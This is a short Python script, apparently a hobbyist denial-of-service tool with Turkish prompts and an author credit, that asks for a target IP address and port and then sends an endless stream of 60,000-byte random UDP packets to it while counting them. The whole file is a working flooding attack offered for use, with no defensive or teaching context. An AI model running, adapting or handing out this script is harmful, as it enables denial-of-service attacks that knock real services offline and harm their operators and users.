import os
import random
import socket

os.system("sudo apt-get install figlet")
os.system("clear")
os.system("figlet Ddos Attack")
print(" ")
print("Author --> https://www.instagram.com/weklendy")
print(" ")
print(" ")
target_ip = str(input("Hedef sitenin IP adresi -->   "))
print(" ")
try:
    target_port = int(input("Port numarası girin (80) -->   "))
except ValueError:
    print("Yanlış yapdınız !!!")

bytes = random._urandom(60000)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packega = 0

while True:
    sock.sendto(bytes, (target_ip, target_port))
    packega = packega+1
    print("Gönderiliyor -->  %s" %(packega))
